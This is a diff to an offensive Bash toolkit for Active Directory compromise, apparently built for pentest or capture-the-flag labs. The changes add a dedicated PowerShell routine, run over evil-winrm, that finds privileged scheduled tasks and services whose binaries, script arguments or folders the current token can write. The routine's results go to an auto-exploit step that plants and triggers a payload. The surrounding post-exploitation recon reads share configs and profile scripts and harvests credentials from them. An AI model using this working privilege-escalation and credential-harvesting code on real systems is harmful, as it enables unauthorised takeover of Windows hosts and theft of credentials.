@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.44.0"
+readonly VERSION="1.44.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -357,10 +357,10 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
     # Record the attack-chain edge (the identity we're acting as --via--> this one)
     # the FIRST time we learn of it. CRITICAL: never assign a parent to an identity
     # that is ALREADY compromised/assessed (in OWNED_GROUPS) — otherwise, when a
-    # later node re-harvests an earlier root (e.g. msa_health$ re-reading svc_recovery
-    # from the shares), the root gets a false parent and the chain becomes a CYCLE
-    # (svc_recovery⇄msa_health$), rendered as two duplicate trees. A root keeps no
-    # parent; a genuinely new lead (not yet owned) gets its true discoverer.
+    # later node re-harvests an earlier root (e.g. a gMSA re-reading the user that owned
+    # it from the shares), the root gets a false parent and the chain becomes a CYCLE
+    # (A⇄B), rendered as two duplicate trees. A root keeps no parent; a genuinely new
+    # lead (not yet owned) gets its true discoverer.
     if [[ -z "${CHAIN_VIA[$user_key]:-}" && -z "${OWNED_GROUPS[$user_key]:-}" \
           && -n "${USER,,}" && "${USER,,}" != "$user_key" ]]; then
         CHAIN_FROM["$user_key"]="${USER,,}"; CHAIN_VIA["$user_key"]="$via"
@@ -2712,6 +2712,26 @@ except Exception:
 PY
 }
 
+# Dedicated HIJACK enumeration — run as its OWN short command, NOT buried in the giant
+# recon string (there it runs last and the WinRM timeout cuts it off before it emits
+# anything). Writability is judged against OUR ACTUAL TOKEN (user SID + every group SID),
+# so it catches dirs ACL'd to a specific gMSA / user / group — not just well-known groups.
+# It also inspects scheduled-task ARGUMENTS (e.g. `powershell -File C:\writable\x.ps1`),
+# not only the Execute, since the hijackable file is often the script argument.
+_winrm_hijack_scan() {
+    have evil-winrm || return
+    local ps='$ErrorActionPreference="SilentlyContinue";
+$me=[Security.Principal.WindowsIdentity]::GetCurrent(); $sids=@($me.User.Value)+@($me.Groups|%{$_.Value});
+function _cw($p){ if(-not $p){return ""}; $f=$p.Trim([char]34); $tg=@(); if($f){$tg+=$f}; $pd=Split-Path $f -Parent; if($pd){$tg+=$pd}; $o=@(); foreach($t in $tg){ if($t -and (Test-Path $t)){ try{ $a=(Get-Acl $t).Access|?{ $_.AccessControlType -eq "Allow" -and ($_.FileSystemRights -match "Write|Modify|FullControl|CreateFiles|AppendData|WriteData") -and ($sids -contains (try{$_.IdentityReference.Translate([Security.Principal.SecurityIdentifier]).Value}catch{$_.IdentityReference.Value})) }; if($a){$o+=$t} }catch{} } }; return (($o|Select-Object -Unique) -join "; ") };
+function _paths($s){ $r=@(); if($s){ foreach($m in [regex]::Matches($s,"[A-Za-z]:\\[^ "+[char]34+[char]39+";|]+\.(exe|dll|ps1|bat|cmd|vbs)")){ $r+=$m.Value } }; return $r };
+Get-ScheduledTask | ?{ $_.TaskPath -notmatch "\\Microsoft\\" -and $_.Principal.UserId } | %{ $n=$_.TaskName; $u=$_.Principal.UserId; foreach($ac in $_.Actions){ $c=@(); if($ac.Execute){$c+=$ac.Execute}; $c+=_paths($ac.Arguments); foreach($x in ($c|Select-Object -Unique)){ $w=_cw $x; if($w){ "TASK [{0}] runas={1} exec={2}  WRITABLE: {3}" -f $n,$u,$x,$w } } } };
+Get-CimInstance Win32_Service | ?{ $_.PathName -and $_.PathName -notmatch "system32" } | %{ $b=$_.PathName; if($b -match ([char]34+"([^"+[char]34+"]+)")){$b=$Matches[1]}elseif($b -match "^(\S+)"){$b=$Matches[1]}; $w=_cw $b; if($w){ "SVC [{0}] runas={1} bin={2}  WRITABLE: {3}" -f $_.Name,$_.StartName,$b,$w } };'
+    # Pull the real result lines wherever they land — `-o` ignores any evil-winrm prompt
+    # prefix, and `[^{]` after the bracket skips the echoed `"TASK [{0}]…"` format string.
+    WINRM_TO=180 _winrm_exec "$ps" 2>/dev/null | sed -E 's/\x1b\[[0-9;?]*[a-zA-Z]//g' \
+        | grep -aoE '(TASK|SVC) \[[^{][^]]*\] runas=[^ ]* (exec|bin)=.*WRITABLE: .*' | sort -u
+}
+
 # DLL / binary / script HIJACK auto-exploit. For every privileged scheduled task or
 # service whose binary — OR a directory in its DLL search path — we can WRITE to, plant
 # a controlled payload so OUR command runs in that task's security context. The payload
@@ -2861,22 +2881,16 @@ _winrm_postex() {
     # read small config/script/text files; flag anything WE can write (→ hijack).
     ps+='echo "===NONSTD==="; Get-ChildItem C:\ -Directory -Force -ErrorAction SilentlyContinue | ?{ $_.Name -notmatch "^(Windows|Program Files|Program Files \(x86\)|ProgramData|Users|PerfLogs|Recovery|System Volume Information|\$Recycle.Bin|Config.Msi|Documents and Settings)$" } | %{ $_.FullName; Get-ChildItem $_.FullName -Recurse -Force -ErrorAction SilentlyContinue | Select -First 200 -Expand FullName }; '
     ps+='echo "===CONFIGS==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -Include web.config,*.ps1,*.bat,*.cmd,*.txt,*.xml,*.config,*.json,*.ini -ErrorAction SilentlyContinue | Select -First 25 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }; '
-    ps+='echo "===WRITABLE==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -ErrorAction SilentlyContinue | Select -First 400 | %{ try{ $acl=(Get-Acl $_.FullName).Access | ?{ $_.IdentityReference -match "msa_health|Everyone|Authenticated Users|\\\\Users" -and $_.FileSystemRights -match "Write|Modify|FullControl" }; if($acl){ "WRITABLE-BY-US: "+$_.FullName } }catch{} }; '
+    ps+='echo "===WRITABLE==="; Get-ChildItem C:\inetpub,C:\Share -Recurse -Force -ErrorAction SilentlyContinue | Select -First 400 | %{ try{ $acl=(Get-Acl $_.FullName).Access | ?{ $_.IdentityReference -match "'"${USER%\$}"'|Everyone|Authenticated Users|\\\\Users" -and $_.FileSystemRights -match "Write|Modify|FullControl" }; if($acl){ "WRITABLE-BY-US: "+$_.FullName } }catch{} }; '
     # Scripts/files dropped in user PROFILES (Documents/Desktop/Downloads) are a
     # very common intentional foothold (e.g. a monitor.ps1 that names a scheduled
     # task or a writable path). List them and READ the scripts — generic, catches
     # the pattern on any box without hard-coding a path.
     ps+='echo "===PROFFILES==="; Get-ChildItem C:\Users -Force -ErrorAction SilentlyContinue | %{ $p=$_.FullName; @("Documents","Desktop","Downloads") | %{ Get-ChildItem (Join-Path $p $_) -Recurse -Force -ErrorAction SilentlyContinue } } | ?{ $_.Extension -match "\.(ps1|bat|cmd|vbs|py|kdbx|txt|xml|config|json|ini|xlsx|docx)$" } | Select -First 30 -Expand FullName; '
     ps+='echo "===PROFSCRIPTS==="; Get-ChildItem C:\Users -Recurse -Force -Include *.ps1,*.bat,*.cmd,*.vbs,*.py -ErrorAction SilentlyContinue | ?{ $_.FullName -notmatch "\\AppData\\" } | Select -First 12 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }; '
-    # GENERIC privesc auto-finder: for every non-default scheduled task and every
-    # service (binary outside system32), check whether the binary/script — or its
-    # parent directory — is writable by a low-priv principal (Users/Everyone/Auth
-    # Users/Domain Computers, i.e. us). If so, whatever runs it can be hijacked
-    # (overwrite the file, or plant a new file / DLL in the writable dir). No
-    # hard-coded task names or paths — pure ACL correlation.
-    ps+='echo "===HIJACK==="; function _cw($p){ if(-not $p){return ""}; $f=$p.Trim([char]34); $tg=@(); if($f){ $tg+=$f }; $pd=Split-Path $f -Parent; if($pd){ $tg+=$pd }; $o=@(); foreach($t in $tg){ if($t -and (Test-Path $t -ErrorAction SilentlyContinue)){ try{ $a=(Get-Acl $t).Access | ?{ $_.AccessControlType -eq "Allow" -and ($_.FileSystemRights -match "Write|Modify|FullControl|CreateFiles|AppendData|WriteData") -and ($_.IdentityReference -match "Everyone|Authenticated Users|BUILTIN.{0,2}Users|Domain Users|Domain Computers") }; if($a){ $o+=$t } }catch{} } }; return ($o -join "; ") }; '
-    ps+='Get-ScheduledTask -ErrorAction SilentlyContinue | ?{ $_.TaskPath -notmatch "\\Microsoft\\" } | %{ $u=$_.Principal.UserId; $n=$_.TaskName; foreach($ac in $_.Actions){ if($ac.Execute){ $w=_cw $ac.Execute; if($w){ "TASK [{0}] runas={1} exec={2}  WRITABLE: {3}" -f $n,$u,$ac.Execute,$w } } } }; '
-    ps+='Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ?{ $_.PathName -and $_.PathName -notmatch "system32" } | %{ $b=$_.PathName; if($b -match ([char]34+"([^"+[char]34+"]+)")){ $b=$Matches[1] } elseif($b -match "^(\S+)"){ $b=$Matches[1] }; $w=_cw $b; if($w){ "SVC [{0}] runas={1} bin={2}  WRITABLE: {3}" -f $_.Name,$_.StartName,$b,$w } }\'
+    # NOTE: the privileged-task/service writability auto-finder lives in its OWN command
+    # now (_winrm_hijack_scan, called after this recon) — buried here it ran last and the
+    # WinRM timeout kept cutting it off before it produced anything.
     local out="$OUTDIR/winrm_postex_$(_safe_name "$USER").txt"
     _winrm_exec "$ps" | tee "$out" >>"$LOGFILE"
     [[ ! -s "$out" ]] && { info "WinRM post-ex produced no output (shell/Kerberos issue)"; return; }
@@ -2909,10 +2923,18 @@ _winrm_postex() {
         # \A→…). Double the backslashes so they print literally.
         printf '%s\n' "$body" | head -"$cap" | while IFS= read -r l; do detail "      ${l//\\/\\\\}"; done
     done
-    # Auto-exploit any hijackable privileged task/service we just found: plant a payload
-    # in the writable binary/dir, trigger it, verify, roll back. Gated on --abuse inside.
-    local _hjbody; _hjbody=$(awk '/===HIJACK===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" | grep -E 'TASK \[|SVC \[')
-    [[ -n "$_hjbody" ]] && _winrm_hijack_exploit "$_hjbody"
+    # Auto-exploit any hijackable privileged task/service. Use the DEDICATED scan (the
+    # inline HIJACK section runs last in the giant recon and the WinRM timeout cuts it
+    # off → it comes back empty). Then plant → trigger → verify → roll back (--abuse).
+    subsection "Hijackable privileged tasks/services (writable binary/arg/dir)"
+    local _hjbody; _hjbody=$(_winrm_hijack_scan)
+    if [[ -n "$_hjbody" ]]; then
+        loot "${C_RED}${C_BOLD}★★ HIJACKABLE — a privileged task/service loads something we can WRITE:${C_RESET}"
+        printf '%s\n' "$_hjbody" | head -20 | while IFS= read -r l; do detail "      ${l//\\/\\\\}"; done
+        _winrm_hijack_exploit "$_hjbody"
+    else
+        info "No task/service with a binary/argument/dir writable by our token"
+    fi
     # Harvest credentials from script/config content — but ONLY from lines that look
     # like an actual cred assignment (keyword + : or =). Feeding raw script text to
     # the generic harvester flagged identifiers/filenames (OfficeIntegrator.ps1) as
